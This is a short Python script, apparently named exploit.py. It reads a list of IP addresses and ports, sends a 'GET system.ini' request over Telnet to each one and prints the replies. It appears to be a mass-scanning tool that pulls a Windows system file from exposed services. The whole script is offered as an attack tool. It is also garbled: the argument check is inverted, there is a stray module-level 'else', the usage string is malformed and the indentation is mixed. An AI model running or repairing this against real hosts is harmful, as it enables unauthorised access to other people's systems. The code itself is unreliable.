#!/usr/bin/python3

from telnetlib import Telnet 
import socket
import sys


args = sys.argv

def main():
    if len(sys.argv) == 1:
        f = open(args[1])
        lines = f.readlines()
        
        for line in lines:
        	data = line.split()
        	try:
        		try:
        			with Telnet(str(data[0]), int(data[1]), 0.5) as tn:
        				tn.write(b"GET system.ini\n\n")
        				print("---------------\\http://" + data[0] + ":" + data[1] + "\\----------------------------")
        				print(tn.read_all())
        				tn.close()
        		except socket.timeout:
        			print(data[0] + "timeout...")
        	except:
        		pass
            
else:
	print("Usage: ./exploit.py <ip&port.txt">
          
          
if __name__ == '__main__':
    main()
